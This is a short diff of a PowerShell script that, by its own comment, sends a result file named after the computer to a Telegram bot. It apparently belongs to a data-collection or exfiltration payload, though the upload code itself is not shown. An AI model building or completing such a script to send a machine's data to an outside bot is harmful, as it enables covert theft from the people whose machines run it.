@@ -25,7 +25,7 @@ Start-Sleep -Milliseconds 15000
 # Send the result file to a Telegram bot
 # $BotToken = "bot-token"
 # $ChatID = "chat-id"
-$ResultFile = "$env:computername.txt"
+$ResultFile = "$Test\$env:computername.txt"
 
 try {
     # Create a byte array from the file
